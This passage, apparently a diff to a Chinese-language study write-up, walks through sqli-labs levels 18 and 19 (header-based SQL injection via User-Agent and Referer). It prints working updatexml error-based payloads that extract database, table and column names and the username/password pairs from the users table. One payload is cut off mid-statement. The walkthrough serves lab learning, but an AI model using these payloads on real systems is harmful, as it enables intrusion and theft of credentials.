@@ -903,3 +903,145 @@ passwd=111'+and+(updatexml(1,concat(0x7e,(select+password+from+(select+password+
 
 ## 第十八关
 
+![image-20210602192059992](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602192059992.png)
+
+数据包请求头注入，抓包测试一下
+
+这一关的代码：
+
+![image-20210602193555386](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602193555386.png)
+
+由于select语句做了很强的过滤，所以他并不存在注入，所以咱们只能从insert语句下手了。但是insert成功执行的前提就是需要成功输入正确的用户名和密码，才能执行到insert语句。
+
+![image-20210602194023706](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602194023706.png)
+
+接下来就是尝试在UA字段或者XXF字段注入SQL代码
+
+![image-20210602194220760](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602194220760.png)
+
+根据上述图片咱们发现XXF字段对ip并没有什么影响，所以尝试在ua字段中进行注入。在1后面加上单引号，报了语法错误，很明显此关卡是单引号字符注入。
+
+![image-20210602194354165](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602194354165.png)
+
+看到报错信息，猜想后台的insert语句应该是 ： `insert into table values('User-Agent','ip','username')`
+
+接下来我们尝试在User-Agent的位置进行注入测试，我们修改User-Agent的值使其符合整个insert into的语法，闭合后就应该为 `insert into table values('1',1,1)#'ip','username')`,成功绕过
+
+![image-20210602195344190](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602195344190.png)
+
+现在利用报错注入语句来注入到insert语句中
+
+爆破出当前数据库
+
+payload：
+
+~~~
+1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
+~~~
+
+![image-20210602200726586](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602200726586.png)
+
+获取当前数据库中的表名：
+
+~~~
+1',1,updatexml(1,concat(0x7e,(select group_concat(table_name)
+~~~
+
+![image-20210602201329697](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602201329697.png)
+
+获取users表中的字段：
+
+~~~
+1',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema="security"),0x7e),1))#
+~~~
+
+![image-20210602201505454](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602201505454.png)
+
+获取security.users表中的数据：
+
+~~~
+1',1,updatexml(1,concat(0x7e,(select group_concat(concat(username,0x7e,password)) from security.users),0x7e),1))#
+~~~
+
+![image-20210602201926359](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602201926359.png)	
+
+成功获得users表中的数据
+
+## 第十九关
+
+![image-20210602202311752](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602202311752.png)
+
+![image-20210602202452936](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602202452936.png)
+
+这个关卡跟上一个关卡一样，都需要输入正确的username和password，才能进行insert注入。本关卡是对Referer字段字段进行注入：
+
+![image-20210602202656722](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602202656722.png)
+
+输入单引号提示有语法错误，本关卡是单引号字符型注入。但是并没有回显insert注入的字段有几个，咱们只能猜测了。
+
+一个注入字段报错
+
+![image-20210602203036348](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602203036348.png)
+
+两个注入字段成功
+
+![image-20210602203119236](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602203119236.png)
+
+下面使用报错注入开始获取数据库中的数据信息
+
+获取当前数据库名称信息：
+
+~~~
+1',updatexml(1,concat(0x7e,(select database()),0x7e),1))#
+~~~
+
+![image-20210602203720724](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602203720724.png)
+
+获取所有数据库名称信息：**用substring()函数获取了全部信息**
+
+~~~
+1',updatexml(1,concat(0x7e,(select substring(group_concat(schema_name),1) from information_schema.schemata ),0x7e),1))#
+1',updatexml(1,concat(0x7e,(select substring(group_concat(schema_name),30) from information_schema.schemata ),0x7e),1))#
+1',updatexml(1,concat(0x7e,(select substring(group_concat(schema_name),60) from information_schema.schemata ),0x7e),1))#
+~~~
+
+![image-20210602204133315](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204133315.png)
+
+![image-20210602204303568](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204303568.png)
+
+![image-20210602204406153](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204406153.png)
+
+获取security数据库中所有表的名称
+
+~~~
+1',updatexml(1,concat(0x7e,(select substring(group_concat(table_name),1) from information_schema.tables where table_schema="security"),0x7e),1))#
+~~~
+
+![image-20210602204525176](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204525176.png)
+
+获取security.users表中的字段信息：
+
+~~~
+1',updatexml(1,concat(0x7e,(select substring(group_concat(column_name),1) from information_schema.columns where table_schema="security" and table_name="users"),0x7e),1))#
+~~~
+
+![image-20210602204640784](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204640784.png)
+
+获取security.users表中的数据信息：
+
+~~~
+1',updatexml(1,concat(0x7e,(select substring(group_concat(concat(username,0x7e,password)),1) from security.users),0x7e),1))#
+1',updatexml(1,concat(0x7e,(select substring(group_concat(concat(username,0x7e,password)),30) from security.users),0x7e),1))#
+1',updatexml(1,concat(0x7e,(select substring(group_concat(concat(username,0x7e,password)),60) from security.users),0x7e),1))#
+~~~
+
+![image-20210602204815178](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204815178.png)
+
+![image-20210602204911776](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204911776.png)
+
+![image-20210602204926621](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204926621.png)
+
+获取了全部的users表中的信息
+
+## 第二十关
+
